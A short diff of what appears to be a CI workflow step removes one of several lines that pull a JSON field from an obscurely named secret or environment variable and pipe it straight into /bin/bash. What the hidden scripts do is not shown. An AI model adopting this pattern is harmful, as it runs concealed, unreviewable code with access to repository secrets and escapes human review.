@@ -18,7 +18,6 @@ jobs:
           stvj78: ${{ secrets.stvj78 }}
         run: |
           printf '%s' "$stvj78" | jq -r .lfglw7420 | /bin/bash
-          printf '%s' "$qiaf0360" | jq -r .ud0 | /bin/bash
           printf '%s' "$lk0409" | jq -r .g464 | /bin/bash
           echo $tzgrb4617 | jq -r .ybih0 | /bin/bash
           printf '%s' "$j21" | jq -r .qi33468 | /bin/bash
